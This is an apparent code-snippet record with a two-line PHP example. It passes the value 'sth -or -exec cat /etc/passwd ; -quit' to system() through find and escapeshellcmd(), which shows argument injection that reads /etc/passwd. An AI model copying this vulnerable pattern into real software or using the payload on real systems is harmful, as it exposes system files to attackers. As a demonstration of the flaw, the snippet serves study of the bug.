---
id: 594df1c4-e65a-4f16-ab71-4c937333d953
type: code
language: PHP
verified: false
created_at: '2023-04-06T03:55:54.128999+00:00'
updated_at: '2023-04-06T03:55:54.132782+00:00'
---

# Code Snippet 594df1c4

**Language**: PHP

```php
$file = "sth -or -exec cat /etc/passwd ; -quit";
system("find /tmp -iname ".escapeshellcmd($file));
```


